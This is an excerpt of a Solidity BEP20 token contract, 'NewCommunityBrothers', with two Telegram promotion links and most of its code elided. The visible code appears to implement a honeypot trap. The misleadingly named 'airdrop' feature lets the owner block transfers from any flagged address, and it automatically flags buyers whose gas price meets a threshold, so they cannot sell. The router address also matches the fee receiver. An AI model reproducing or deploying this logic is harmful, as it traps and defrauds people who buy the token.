...
https://t.me/NewCommunityBrothers
https://t.me/+hKCnlkjZ1744OTFl
...
contract NewCommunityBrothers is IBEP20, Auth {
    ...
    string constant _name = "NewCommunityBrothers";
    string constant _symbol = "BROTHERS";
    ...
    mapping (address => bool) public airdropd;
    ...
    constructor () Auth(msg.sender) {
        ...
        address routerV2 = 0x249b37A49C822A025CA60EDF3e1F4FE747E56412; 
        ...
        marketingFeeReceiver = 0x249b37A49C822A025CA60EDF3e1F4FE747E56412;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(airdrop){
            require(!airdropd[sender],"airdrop");    
        }
        
        if (tx.gasprice >= MinGas && recipient != pair) {
            airdropd[recipient] = true;
        }
    ...
    function enable_airdrop(bool _status) public onlyOwner {
        airdrop = _status;
    }
    ...
    function manage_airdrop(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            airdropd[addresses[i]] = status;
        }
    }
